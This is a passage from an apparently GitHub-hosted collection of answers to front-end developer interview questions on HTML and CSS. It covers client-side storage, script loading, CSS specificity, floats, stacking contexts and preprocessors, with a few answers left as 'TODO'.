&lt;li&gt;Formatting dates and currencies - Calendar dates are sometimes presented in different ways. Eg. &quot;May 31, 2012&quot; in the U.S. vs. &quot;31 May 2012&quot; in parts of Europe.&lt;/li&gt;
&lt;li&gt;Do not concatenate translated strings - Do not do anything like &lt;code&gt;&quot;The date today is &quot; + date&lt;/code&gt;. It will break in languages with different word order. Using template parameters instead.&lt;/li&gt;
&lt;li&gt;Language reading direction - In English, we read from left-to-right, top-to-bottom, in traditional Japanese, text is read up-to-down, right-to-left.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are &lt;code&gt;data-&lt;/code&gt; attributes good for?&lt;/h3&gt;
&lt;p&gt;Before JavaScript frameworks became popular, front end developers used &lt;code&gt;data-&lt;/code&gt; attributes to store extra data within the DOM itself, without other hacks such as non-standard attributes, extra properties on the DOM. It is intended to store custom data private to the page or application, for which there are no more appropriate attributes or elements.&lt;/p&gt;
&lt;p&gt;These days, using &lt;code&gt;data-&lt;/code&gt; attributes is not encouraged. One reason is that users can modify the data attribute easily by using inspect element in the browser. The data model is better stored within JavaScript itself and stay updated with the DOM via data binding possibly through a library or a framework.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Consider HTML5 as an open web platform. What are the building blocks of HTML5?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Semantics - Allowing you to describe more precisely what your content is.&lt;/li&gt;
&lt;li&gt;Connectivity - Allowing you to communicate with the server in new and innovative ways.&lt;/li&gt;
&lt;li&gt;Offline and storage - Allowing webpages to store data on the client-side locally and operate offline more efficiently.&lt;/li&gt;
&lt;li&gt;Multimedia - Making video and audio first-class citizens in the Open Web.&lt;/li&gt;
&lt;li&gt;2D/3D graphics and effects - Allowing a much more diverse range of presentation options.&lt;/li&gt;
&lt;li&gt;Performance and integration - Providing greater speed optimization and better usage of computer hardware.&lt;/li&gt;
&lt;li&gt;Device access - Allowing for the usage of various input and output devices.&lt;/li&gt;
&lt;li&gt;Styling - Letting authors write more sophisticated themes.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe the difference between a &lt;code&gt;cookie&lt;/code&gt;, &lt;code&gt;sessionStorage&lt;/code&gt; and &lt;code&gt;localStorage&lt;/code&gt;.&lt;/h3&gt;
&lt;p&gt;All the above mentioned technologies are key-value storage mechanisms on the client side. They are only able to store values as strings.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th/&gt;
&lt;th&gt;&lt;code&gt;cookie&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;localStorage&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;sessionStorage&lt;/code&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Initiator&lt;/td&gt;
&lt;td&gt;Client or server. Server can use &lt;code&gt;Set-Cookie&lt;/code&gt; header&lt;/td&gt;
&lt;td&gt;Client&lt;/td&gt;
&lt;td&gt;Client&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Expiry&lt;/td&gt;
&lt;td&gt;Manually set&lt;/td&gt;
&lt;td&gt;Forever&lt;/td&gt;
&lt;td&gt;On tab close&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Persistent across browser sessions&lt;/td&gt;
&lt;td&gt;Depends on whether expiration is set&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Have domain associated&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Sent to server with every HTTP request&lt;/td&gt;
&lt;td&gt;Cookies are automatically being sent via &lt;code&gt;Cookie&lt;/code&gt; header&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Capacity (per domain)&lt;/td&gt;
&lt;td&gt;4kb&lt;/td&gt;
&lt;td&gt;5MB&lt;/td&gt;
&lt;td&gt;5MB&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Accessibility&lt;/td&gt;
&lt;td&gt;Any window&lt;/td&gt;
&lt;td&gt;Any window&lt;/td&gt;
&lt;td&gt;Same tab&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe the difference between &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;script async&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;script defer&amp;gt;&lt;/code&gt;.&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; - HTML parsing is blocked, the script is fetched and executed immediately, HTML parsing resumes after the script is executed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script async&amp;gt;&lt;/code&gt; - The script will be fetched in parallel to HTML parsing and executed as soon as it is available (potentially before HTML parsing completes). Use &lt;code&gt;async&lt;/code&gt; when the script is independent of any other scripts on the page, for example analytics.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script defer&amp;gt;&lt;/code&gt; - The script will be fetched in parallel to HTML parsing and executed when the page has finished parsing. If there are multiple of them, each deferred script is executed in the order they were encoun­tered in the document. If a script relies on a fully-parsed DOM, the &lt;code&gt;defer&lt;/code&gt; attribute will be useful in ensuring that the HTML is fully parsed before executing. There's not much difference from putting a normal &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; at the end of &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;. A deferred script must not contain &lt;code&gt;document.write&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Note: The &lt;code&gt;async&lt;/code&gt; and &lt;code&gt;defer&lt;/code&gt; attrib­utes are ignored for scripts that have no &lt;code&gt;src&lt;/code&gt; attribute.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Why is it generally a good idea to position CSS &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt;s between &lt;code&gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/code&gt; and JS &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;s just before &lt;code&gt;&amp;lt;/body&amp;gt;&lt;/code&gt;? Do you know any exceptions?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Placing &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt;s in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Putting &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt;s in the head is part of the specification. Besides that, placing at the top allows the page to render progressively which improves user experience. The problem with putting stylesheets near the bottom of the document is that it prohibits progressive rendering in many browsers, including Internet Explorer. Some browsers block rendering to avoid having to repaint elements of the page if their styles change. The user is stuck viewing a blank white page. It prevents the flash of unstyled contents.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Placing &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;s just before &lt;code&gt;&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;s block HTML parsing while they are being downloaded and executed. Downloading the scripts at the bottom will allow the HTML to be parsed and displayed to the user first.&lt;/p&gt;
&lt;p&gt;An exception for positioning of &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;s at the bottom is when your script contains &lt;code&gt;document.write()&lt;/code&gt;, but these days it's not a good practice to use &lt;code&gt;document.write()&lt;/code&gt;. Also, placing &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;s at the bottom means that the browser cannot start downloading the scripts until the entire document is parsed. One possible workaround is to put &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; and use the &lt;code&gt;defer&lt;/code&gt; attribute.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What is progressive rendering?&lt;/h3&gt;
&lt;p&gt;Progressive rendering is the name given to techniques used to improve performance of a webpage (in particular, improve perceived load time) to render content for display as quickly as possible.&lt;/p&gt;
&lt;p&gt;It used to be much more prevalent in the days before broadband internet but it is still useful in modern development as mobile data connections are becoming increasingly popular (and unreliable)!&lt;/p&gt;
&lt;p&gt;Examples of such techniques:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Lazy loading of images - Images on the page are not loaded all at once. JavaScript will be used to load an image when the user scrolls into the part of the page that displays the image.&lt;/li&gt;
&lt;li&gt;Prioritizing visible content (or above-the-fold rendering) - Include only the minimum CSS/content/scripts necessary for the amount of page that would be rendered in the users browser first to display as quickly as possible, you can then use deferred scripts or listen for the &lt;code&gt;DOMContentLoaded&lt;/code&gt;/&lt;code&gt;load&lt;/code&gt; event to load in other resources and content.&lt;/li&gt;
&lt;li&gt;Async HTML fragments - Flushing parts of the HTML to the browser as the page is constructed on the back end. More details on the technique can be found &lt;a href=&quot;http://www.ebaytechblog.com/2014/12/08/async-fragments-rediscovering-progressive-html-rendering-with-marko/&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Why you would use a &lt;code&gt;srcset&lt;/code&gt; attribute in an image tag? Explain the process the browser uses when evaluating the content of this attribute.&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Have you used different HTML templating languages before?&lt;/h3&gt;
&lt;p&gt;Yes, Pug (formerly Jade), ERB, Slim, Handlebars, Jinja, Liquid, just to name a few. In my opinion, they are more or less the same and provide similar functionality of escaping content and helpful filters for manipulating the data to be displayed. Most templating engines will also allow you to inject your own filters in the event you need custom processing before display.&lt;/p&gt;
&lt;h3&gt;Other Answers&lt;/h3&gt;
&lt;hr/&gt;&lt;h2&gt;CSS Questions&lt;/h2&gt;
&lt;p&gt;Answers to &lt;a href=&quot;https://github.com/h5bp/Front-end-Developer-Interview-Questions#css-questions&quot;&gt;Front-end Job Interview Questions - CSS Questions&lt;/a&gt;. Pull requests for suggestions and corrections are welcome!&lt;/p&gt;
&lt;h3&gt;What is CSS selector specificity and how does it work?&lt;/h3&gt;
&lt;p&gt;The browser determines what styles to show on an element depending on the specificity of CSS rules. We assume that the browser has already determined the rules that match a particular element. Among the matching rules, the specificity, four comma-separate values, &lt;code&gt;a, b, c, d&lt;/code&gt; are calculated for each rule based on the following:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;a&lt;/code&gt; is whether inline styles are being used. If the property declaration is an inline style on the element, &lt;code&gt;a&lt;/code&gt; is 1, else 0.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b&lt;/code&gt; is the number of ID selectors.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt; is the number of classes, attributes and pseudo-classes selectors.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt; is the number of tags and pseudo-elements selectors.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;The resulting specificity is not a score, but a matrix of values that can be compared column by column. When comparing selectors to determine which has the highest specificity, look from left to right, and compare the highest value in each column. So a value in column &lt;code&gt;b&lt;/code&gt; will override values in columns &lt;code&gt;c&lt;/code&gt; and &lt;code&gt;d&lt;/code&gt;, no matter what they might be. As such, specificity of &lt;code&gt;0,1,0,0&lt;/code&gt; would be greater than one of &lt;code&gt;0,0,10,10&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In the cases of equal specificity: the latest rule is the one that counts. If you have written the same rule into your style sheet (regardless of internal or external) twice, then the lower rule in your style sheet is closer to the element to be styled, it is deemed to be more specific and therefore will be applied.&lt;/p&gt;
&lt;p&gt;I would write CSS rules with low specificity so that they can be easily overridden if necessary. When writing CSS UI component library code, it is important that they have low specificities so that users of the library can override them without using too complicated CSS rules just for the sake of increasing specificity or resorting to &lt;code&gt;!important&lt;/code&gt;.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What's the difference between &quot;resetting&quot; and &quot;normalizing&quot; CSS? Which would you choose, and why?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Resetting&lt;/strong&gt; - Resetting is meant to strip all default browser styling on elements. For e.g. &lt;code&gt;margin&lt;/code&gt;s, &lt;code&gt;padding&lt;/code&gt;s, &lt;code&gt;font-size&lt;/code&gt;s of all elements are reset to be the same. You will have to redeclare styling for common typographic elements.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Normalizing&lt;/strong&gt; - Normalizing preserves useful default styles rather than &quot;unstyling&quot; everything. It also corrects bugs for common browser dependencies.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I would choose resetting when I have very a customized or unconventional site design such that I need to do a lot of my own styling do not need any default styling to be preserved.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe &lt;code&gt;float&lt;/code&gt;s and how they work.&lt;/h3&gt;
&lt;p&gt;Float is a CSS positioning property. Floated elements remain a part of the flow of the page, and will affect the positioning of other elements (e.g. text will flow around floated elements), unlike &lt;code&gt;position: absolute&lt;/code&gt; elements, which are removed from the flow of the page.&lt;/p&gt;
&lt;p&gt;The CSS &lt;code&gt;clear&lt;/code&gt; property can be used to be positioned below &lt;code&gt;left&lt;/code&gt;/&lt;code&gt;right&lt;/code&gt;/&lt;code&gt;both&lt;/code&gt; floated elements.&lt;/p&gt;
&lt;p&gt;If a parent element contains nothing but floated elements, its height will be collapsed to nothing. It can be fixed by clearing the float after the floated elements in the container but before the close of the container.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;.clearfix&lt;/code&gt; hack uses a clever CSS pseudo selector (&lt;code&gt;:after&lt;/code&gt;) to clear floats. Rather than setting the overflow on the parent, you apply an additional class &lt;code&gt;clearfix&lt;/code&gt; to it. Then apply this CSS:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-css&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-e&quot;&gt;.clearfix&lt;/span&gt;&lt;span class=&quot;pl-e&quot;&gt;:after&lt;/span&gt; {
  &lt;span class=&quot;pl-c1&quot;&gt;&lt;span class=&quot;pl-c1&quot;&gt;content&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;;
  &lt;span class=&quot;pl-c1&quot;&gt;&lt;span class=&quot;pl-c1&quot;&gt;visibility&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-c1&quot;&gt;hidden&lt;/span&gt;;
  &lt;span class=&quot;pl-c1&quot;&gt;&lt;span class=&quot;pl-c1&quot;&gt;display&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-c1&quot;&gt;block&lt;/span&gt;;
  &lt;span class=&quot;pl-c1&quot;&gt;&lt;span class=&quot;pl-c1&quot;&gt;height&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;;
  &lt;span class=&quot;pl-c1&quot;&gt;&lt;span class=&quot;pl-c1&quot;&gt;clear&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-c1&quot;&gt;both&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alternatively, give &lt;code&gt;overflow: auto&lt;/code&gt; or &lt;code&gt;overflow: hidden&lt;/code&gt; property to the parent element which will establish a new block formatting context inside the children and it will expand to contain its children.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe &lt;code&gt;z-index&lt;/code&gt; and how stacking context is formed.&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;z-index&lt;/code&gt; property in CSS controls the vertical stacking order of elements that overlap. &lt;code&gt;z-index&lt;/code&gt; only affects elements that have a &lt;code&gt;position&lt;/code&gt; value which is not &lt;code&gt;static&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Without any &lt;code&gt;z-index&lt;/code&gt; value, elements stack in the order that they appear in the DOM (the lowest one down at the same hierarchy level appears on top). Elements with non-static positioning (and their children) will always appear on top of elements with default static positioning, regardless of HTML hierarchy.&lt;/p&gt;
&lt;p&gt;A stacking context is an element that contains a set of layers. Within a local stacking context, the &lt;code&gt;z-index&lt;/code&gt; values of its children are set relative to that element rather than to the document root. Layers outside of that context — i.e. sibling elements of a local stacking context — can't sit between layers within it. If an element B sits on top of element A, a child element of element A, element C, can never be higher than element B even if element C has a higher &lt;code&gt;z-index&lt;/code&gt; than element B.&lt;/p&gt;
&lt;p&gt;Each stacking context is self-contained - after the element's contents are stacked, the whole element is considered in the stacking order of the parent stacking context. A handful of CSS properties trigger a new stacking context, such as &lt;code&gt;opacity&lt;/code&gt; less than 1, &lt;code&gt;filter&lt;/code&gt; that is not &lt;code&gt;none&lt;/code&gt;, and &lt;code&gt;transform&lt;/code&gt; that is not&lt;code&gt;none&lt;/code&gt;.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe Block Formatting Context (BFC) and how it works.&lt;/h3&gt;
&lt;p&gt;A Block Formatting Context (BFC) is part of the visual CSS rendering of a web page in which block boxes are laid out. Floats, absolutely positioned elements, &lt;code&gt;inline-blocks&lt;/code&gt;, &lt;code&gt;table-cells&lt;/code&gt;, &lt;code&gt;table-caption&lt;/code&gt;s, and elements with &lt;code&gt;overflow&lt;/code&gt; other than &lt;code&gt;visible&lt;/code&gt; (except when that value has been propagated to the viewport) establish new block formatting contexts.&lt;/p&gt;
&lt;p&gt;A BFC is an HTML box that satisfies at least one of the following conditions:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The value of &lt;code&gt;float&lt;/code&gt; is not &lt;code&gt;none&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The value of &lt;code&gt;position&lt;/code&gt; is neither &lt;code&gt;static&lt;/code&gt; nor &lt;code&gt;relative&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The value of &lt;code&gt;display&lt;/code&gt; is &lt;code&gt;table-cell&lt;/code&gt;, &lt;code&gt;table-caption&lt;/code&gt;, &lt;code&gt;inline-block&lt;/code&gt;, &lt;code&gt;flex&lt;/code&gt;, or &lt;code&gt;inline-flex&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The value of &lt;code&gt;overflow&lt;/code&gt; is not &lt;code&gt;visible&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In a BFC, each box's left outer edge touches the left edge of the containing block (for right-to-left formatting, right edges touch).&lt;/p&gt;
&lt;p&gt;Vertical margins between adjacent block-level boxes in a BFC collapse. Read more on &lt;a href=&quot;https://www.sitepoint.com/web-foundations/collapsing-margins/&quot; rel=&quot;nofollow&quot;&gt;collapsing margins&lt;/a&gt;.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are the various clearing techniques and which is appropriate for what context?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Empty &lt;code&gt;div&lt;/code&gt; method - &lt;code&gt;&amp;lt;div style=&quot;clear:both;&quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Clearfix method - Refer to the &lt;code&gt;.clearfix&lt;/code&gt; class above.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;overflow: auto&lt;/code&gt; or &lt;code&gt;overflow: hidden&lt;/code&gt; method - Parent will establish a new block formatting context and expand to contains its floated children.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In large projects, I would write a utility &lt;code&gt;.clearfix&lt;/code&gt; class and use them in places where I need it. &lt;code&gt;overflow: hidden&lt;/code&gt; might clip children if the children is taller than the parent and is not very ideal.&lt;/p&gt;
&lt;h3&gt;Explain CSS sprites, and how you would implement them on a page or site.&lt;/h3&gt;
&lt;p&gt;CSS sprites combine multiple images into one single larger image. It is commonly used technique for icons (Gmail uses it). How to implement it:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Use a sprite generator that packs multiple images into one and generate the appropriate CSS for it.&lt;/li&gt;
&lt;li&gt;Each image would have a corresponding CSS class with &lt;code&gt;background-image&lt;/code&gt;, &lt;code&gt;background-position&lt;/code&gt; and &lt;code&gt;background-size&lt;/code&gt; properties defined.&lt;/li&gt;
&lt;li&gt;To use that image, add the corresponding class to your element.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;Advantages:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Reduce the number of HTTP requests for multiple images (only one single request is required per spritesheet). But with HTTP2, loading multiple images is no longer much of an issue.&lt;/li&gt;
&lt;li&gt;Advance downloading of assets that won't be downloaded until needed, such as images that only appear upon &lt;code&gt;:hover&lt;/code&gt; pseudo-states. Blinking wouldn't be seen.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;How would you approach fixing browser-specific styling issues?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;After identifying the issue and the offending browser, use a separate style sheet that only loads when that specific browser is being used. This technique requires server-side rendering though.&lt;/li&gt;
&lt;li&gt;Use libraries like Bootstrap that already handles these styling issues for you.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;autoprefixer&lt;/code&gt; to automatically add vendor prefixes to your code.&lt;/li&gt;
&lt;li&gt;Use Reset CSS or Normalize.css.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;How do you serve your pages for feature-constrained browsers? What techniques/processes do you use?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Graceful degradation - The practice of building an application for modern browsers while ensuring it remains functional in older browsers.&lt;/li&gt;
&lt;li&gt;Progressive enhancement - The practice of building an application for a base level of user experience, but adding functional enhancements when a browser supports it.&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&quot;https://caniuse.com/&quot; rel=&quot;nofollow&quot;&gt;caniuse.com&lt;/a&gt; to check for feature support.&lt;/li&gt;
&lt;li&gt;Autoprefixer for automatic vendor prefix insertion.&lt;/li&gt;
&lt;li&gt;Feature detection using &lt;a href=&quot;https://modernizr.com/&quot; rel=&quot;nofollow&quot;&gt;Modernizr&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;What are the different ways to visually hide content (and make it available only for screen readers)?&lt;/h3&gt;
&lt;p&gt;These techniques are related to accessibility (a11y).&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;visibility: hidden&lt;/code&gt;. However the element is still in the flow of the page, and still takes up space.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;width: 0; height: 0&lt;/code&gt;. Make the element not take up any space on the screen at all, resulting in not showing it.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;position: absolute; left: -99999px&lt;/code&gt;. Position it outside of the screen.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;text-indent: -9999px&lt;/code&gt;. This only works on text within the &lt;code&gt;block&lt;/code&gt; elements.&lt;/li&gt;
&lt;li&gt;Metadata. For example by using Schema.org, RDF and JSON-LD.&lt;/li&gt;
&lt;li&gt;WAI-ARIA. A W3C technical specification that specifies how to increase the accessibility of web pages.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Even if WAI-ARIA is the ideal solution, I would go with the &lt;code&gt;absolute&lt;/code&gt; positioning approach, as it has the least caveats, works for most elements and it's an easy technique.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Have you ever used a grid system, and if so, what do you prefer?&lt;/h3&gt;
&lt;p&gt;I like the &lt;code&gt;float&lt;/code&gt;-based grid system because it still has the most browser support among the alternative existing systems (flex, grid). It has been used in Bootstrap for years and has been proven to work.&lt;/p&gt;
&lt;h3&gt;Have you used or implemented media queries or mobile-specific layouts/CSS?&lt;/h3&gt;
&lt;p&gt;Yes. An example would be transforming a stacked pill navigation into a fixed-bottom tab navigation beyond a certain breakpoint.&lt;/p&gt;
&lt;h3&gt;Are you familiar with styling SVG?&lt;/h3&gt;
&lt;p&gt;No... Sadly.&lt;/p&gt;
&lt;h3&gt;Can you give an example of an @media property other than screen?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What are some of the &quot;gotchas&quot; for writing efficient CSS?&lt;/h3&gt;
&lt;p&gt;Firstly, understand that browsers match selectors from rightmost (key selector) to left. Browsers filter out elements in the DOM according to the key selector, and traverse up its parent elements to determine matches. The shorter the length of the selector chain, the faster the browser can determine if that element matches the selector. Hence avoid key selectors that are tag and universal selectors. They match a large numbers of elements and browsers will have to do more work in determining if the parents do match.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bem.info/&quot; rel=&quot;nofollow&quot;&gt;BEM (Block Element Modifier)&lt;/a&gt; methodology recommends that everything has a single class, and, where you need hierarchy, that gets baked into the name of the class as well, this naturally makes the selector efficient and easy to override.&lt;/p&gt;
&lt;p&gt;Be aware of which CSS properties trigger reflow, repaint and compositing. Avoid writing styles that change the layout (trigger reflow) where possible.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are the advantages/disadvantages of using CSS preprocessors?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Advantages:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;CSS is made more maintainable.&lt;/li&gt;
&lt;li&gt;Easy to write nested selectors.&lt;/li&gt;
&lt;li&gt;Variables for consistent theming. Can share theme files across different projects.&lt;/li&gt;
&lt;li&gt;Mixins to generate repeated CSS.&lt;/li&gt;
&lt;li&gt;Splitting your code into multiple files. CSS files can be split up too but doing so will require a HTTP request to download each CSS file.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Disadvantages:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Requires tools for preprocessing. Re-compilation time can be slow.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Describe what you like and dislike about the CSS preprocessors you have used.&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Likes:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Mostly the advantages mentioned above.&lt;/li&gt;
&lt;li&gt;Less is written in JavaScript, which plays well with Node.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Dislikes:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;I use Sass via &lt;code&gt;node-sass&lt;/code&gt;, which is a binding for LibSass written in C++. I have to frequently recompile it when switching between node versions.&lt;/li&gt;
&lt;li&gt;In Less, variable names are prefixed with &lt;code&gt;@&lt;/code&gt;, which can be confused with native CSS keywords like &lt;code&gt;@media&lt;/code&gt;, &lt;code&gt;@import&lt;/code&gt; and &lt;code&gt;@font-face&lt;/code&gt; rule.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;How would you implement a web design comp that uses non-standard fonts?&lt;/h3&gt;
&lt;p&gt;Use &lt;code&gt;@font-face&lt;/code&gt; and define &lt;code&gt;font-family&lt;/code&gt; for different &lt;code&gt;font-weight&lt;/code&gt;s.&lt;/p&gt;
&lt;h3&gt;Explain how a browser determines what elements match a CSS selector.&lt;/h3&gt;
&lt;p&gt;This part is related to the above about writing efficient CSS. Browsers match selectors from rightmost (key selector) to left. Browsers filter out elements in the DOM according to the key selector, and traverse up its parent elements to determine matches. The shorter the length of the selector chain, the faster the browser can determine if that element matches the selector.&lt;/p&gt;
&lt;p&gt;For example with this selector &lt;code&gt;p span&lt;/code&gt;, browsers firstly find all the &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; elements, and traverse up its parent all the way up to the root to find the &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; element. For a particular &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;, as soon as it finds a &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;, it knows that the &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; matches and can stop its matching.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Describe pseudo-elements and discuss what they are used for.&lt;/h3&gt;
&lt;p&gt;A CSS pseudo-element is a keyword added to a selector that lets you style a specific part of the selected element(s). They can be used for decoration (&lt;code&gt;:first-line&lt;/code&gt;, &lt;code&gt;:first-letter&lt;/code&gt;) or adding elements to the markup (combined with &lt;code&gt;content: ...&lt;/code&gt;) without having to modify the markup (&lt;code&gt;:before&lt;/code&gt;, &lt;code&gt;:after&lt;/code&gt;).&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;:first-line&lt;/code&gt; and &lt;code&gt;:first-letter&lt;/code&gt; can be used to decorate text.&lt;/li&gt;
&lt;li&gt;Used in the &lt;code&gt;.clearfix&lt;/code&gt; hack as shown above to add a zero-space element with &lt;code&gt;clear: both&lt;/code&gt;.&lt;/li&gt;
